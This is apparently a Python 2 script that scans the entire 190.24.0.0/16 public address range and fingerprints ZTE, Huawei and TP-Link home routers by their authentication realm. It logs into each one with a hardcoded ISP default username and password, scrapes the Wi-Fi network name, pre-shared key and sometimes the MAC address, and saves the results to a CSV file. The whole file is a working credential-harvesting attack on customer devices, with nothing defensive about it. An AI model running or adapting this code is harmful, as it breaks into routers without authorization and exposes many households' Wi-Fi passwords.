import requests as rq
from netaddr import *
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
global user, password

unknow_device = open("Devices.txt", "wb")
redes = open("redes.csv", "wb")
device = ""

 
user = "Customer"
password = "ClienteETB2006"



def w300R(ip):
    code = "403"
    while code !="200":
        
        #/basic/home_wlan.htm
        req = rq.get(ip+"/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        
        code = str(req.status_code)
        if code == "200":
            break
    try:
        req = rq.get(ip+"/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        source = BeautifulSoup(req.content, "html.parser")
        for red in source.find_all("input", {"name":"BeetelESSID"}):
            ssid = str(red["value"])
            if ssid == "CPE-WI-FI_ETB":
                print str(ip)+" Free wifi \n//////////////////////////////////"
                redes.write(str(ip)+",free wifi\n")
            for clave in source.find_all("input", {"name":"BeetelPreSharedKey"}):
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address
                redes.write(str(ip)+","+ssid+","+pss+"\n")
                print "////////////////////////////////////////////////////"
    except:
        redes.write(str(ip)+",posible rom-0")
        
############################
def w300R1(ip):
    code = "403"
    print ip
    while code !="200":
        
        #/basic/home_wlan.htm
        req = rq.get(ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        
        code = str(req.status_code)
        if code == "200":
            break
    try:
        req = rq.get(ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        source = BeautifulSoup(req.content, "html.parser")
        for red in source.find_all("input", {"name":"ESSID"}):
            ssid = str(red["value"])
            if ssid == "CPE-WI-FI_ETB":
                print str(ip)+" Free wifi \n//////////////////////////////////"
                redes.write(str(ip)+",free wifi\n")
            for clave in source.find_all("input", {"name":"PreSharedKey"}):
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address
                redes.write(str(ip)+","+ssid+","+pss+"\n")
                print "////////////////////////////////////////////////////"
    except:
        redes.write(str(ip)+",posible rom-0")
        

  
def w300ER(ip):
    code = "403"
    while code != "200":
        req = rq.get(ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False) #.. /basic/wlan_simple.htm
        code = str(req.status_code)
        if code == "200":
            break
#/basic/wlan_simple.htm 190.24.0.10 /basic/wlan_simple.htm
    try:
        req = rq.get(ip+"/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        #req = rq.get("http://190.24.0.10/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None)
        source = BeautifulSoup(req.content, "html.parser")
        for red in source.find_all("input", {"name":"ESSID"}): #name="" BeetelESSID
            ssid = str(red["value"])
            for clave in source.find_all("input", {"name":"PreSharedKey"}): # BeetelPreSharedKey
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address
                redes.write(str(ip)+","+ssid+","+pss+"\n")
                print "////////////////////////////////////////////////////"
    except:
        #redes.write(str(ip)+",posible rom-0"+"\n")
        req = rq.get(ip+"/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        #req = rq.get("http://190.24.0.10/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=None)
        source = BeautifulSoup(req.content, "html.parser")
        for red in source.find_all("input", {"name":"BeetelESSID"}): #name="" BeetelESSID
            ssid = str(red["value"])
            print ssid
            for clave in source.find_all("input", {"name":"BeetelPreSharedKey"}): # BeetelPreSharedKey
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address
                redes.write(str(ip)+","+ssid+","+pss+"\n")
                print "////////////////////////////////////////////////////"
    

    
def hg520R(ip):
    code = "403"
    
    while code != "200":
        
        req = rq.get(ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        code = str(req.status_code)
        if code == "200":
            break
            
    
    try:
        req = rq.get(ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        source = BeautifulSoup(req.content, "html.parser")
        for red in source.find_all("input", {"name":"ESSID"}):
            ssid = str(red["value"])
            if ssid == "CPE-WI-FI_ETB":
                print str(ip)+" Free wifi \n//////////////////////////////////"
                redes.write(str(ip)+",free wifi\n")
                
            for clave in source.find_all("input", {"name":"PreSharedKey"}):
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address
                redes.write(str(ip)+","+ssid+","+pss+"\n")
                print "////////////////////////////////////////////////////"
    except:
        redes.write(str(ip)+",posible rom-0"+"\n")

    
def hg530R(ip):
    code = "403"
    while code!="200":
        
       req = rq.get(ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=None, verify=False) 
       code = str(req.status_code)
       print code
       if code =="200":
           break
    try:
        req = rq.get(ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=None, verify=False)
        source = BeautifulSoup(req.content, "html.parser")
        req_mac = rq.get(ip+"/rpServiceStatus.html", timeout=None)
        mac_address = BeautifulSoup(req_mac, "html.parser")
        for red in source.find_all("input", {"name":"ESSID"}):
            ssid = str(red["value"])
            if ssid == "CPE-WI-FI_ETB":
                print str(ip)+" Free wifi \n//////////////////////////////////"
                redes.write(str(ip)+",free wifi\n")
                
            for clave in source.find_all("input", {"name":"PreSharedKey"}):
                for mac in mac_address.find("td",{"class":"class", "colspan":"3"}):
                    pss = str(clave["value"])
                    print str(ip)
                    print ssid
                    print pss ##pendiente mac address
                    print str(mac)
                    redes.write(str(ip)+","+ssid+","+pss+str(mac)+"\n")
                    print "////////////////////////////////////////////////////"
    except:
        redes.write(str(ip)+",posible rom-0"+"\n")
    
    
def tplinkR(ip):
    code = "403"
    while code != "200":
       req = rq.get(ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=None, verify=False) 
       code = str(req.status_code)
       if code =="200":
           break
    
    try:
        req = rq.get(ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=None,  verify=False)
        source = BeautifulSoup(req.content, "html.parser")
        for red in source.find_all("input", {"name":"ESSID"}):
            ssid = str(red["value"])
            for clave in source.find_all("input", {"name":"PreSharedKey"}):
                pss = str(clave["value"])
                print str(ip)
                print ssid
                print pss ##pendiente mac address /status/status_deviceinfo.htm
                redes.write(str(ip)+","+ssid+","+pss+"\n")
                print "////////////////////////////////////////////////////"
    except:
        redes.write(str(ip)+",posible rom-0")

    

#device =  unknow_device.readlines()



for url in IPNetwork("190.24/16"):
    #http://190.27.229.231/
    #186.28.234.18
    #190.24.1.2
    #186.28.1.216
    
    ip = "http://"+str(url)
    print ">>> GET "+str(url)
    #w300E(ip)
    try:
        r = rq.get(ip, timeout=1)
        header = str(r.headers)
        w300 = 'Basic realm="ZXV10 W300"'
        w300E = 'Basic realm="ZXV10 W300E"'
        huawei = 'Basic realm="EchoLife Home Gateway"'
        hg530 = 'Basic realm="Home Gateway"'
        tp_link = 'Basic realm="TD-W8951ND"'
        if w300 in header: #/basic/home_wlan.htm
            
            print "Soy un w300 "+str(url)
            
            
            req = rq.get(ip+"/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=0.3, verify=False)
            code =  str(req.status_code)
            if code == "200":
                w300R(ip)
            else:
                w300R1(ip)
                
                
        elif w300E in header:
            print "Soy un w300E "+str(url)
            req = rq.get(ip+"/basic/wlan_simple.htm",auth=HTTPBasicAuth(user, password), timeout=0.3, verify=False)
            device = "w300E"
            w300ER(ip)
                
        elif huawei in header:
            req = rq.get(ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=0.3, verify=False)
            print "Soy un huawei hg520 "+str(url) ##hg520b
            hg520R(ip)
                
        elif hg530 in header: 
            req = rq.get(ip+"/home_wlan.html",auth=HTTPBasicAuth(user, password), timeout=0.3, verify=False)
            print "Soy un huawei hg530 "+str(url) #home_wlan.html home_wlan.html
            print "llame la funcion"
            hg530R(ip)
            
        elif tp_link in header:
            req = rq.get(ip+"/basic/home_wlan.htm",auth=HTTPBasicAuth(user, password), timeout=0.4, verify=False)
            print "Soy un Tp-link "+str(url)
            tplinkR(ip)
        else:
            print "Dispositivo desconocido "+str(url)
            unknow_device.write(str(ip)+"\n"+header+"\n-------------------------------------------\n")
            
    except:
        pass
        
        
unknow_device.close()
print "Termine"
        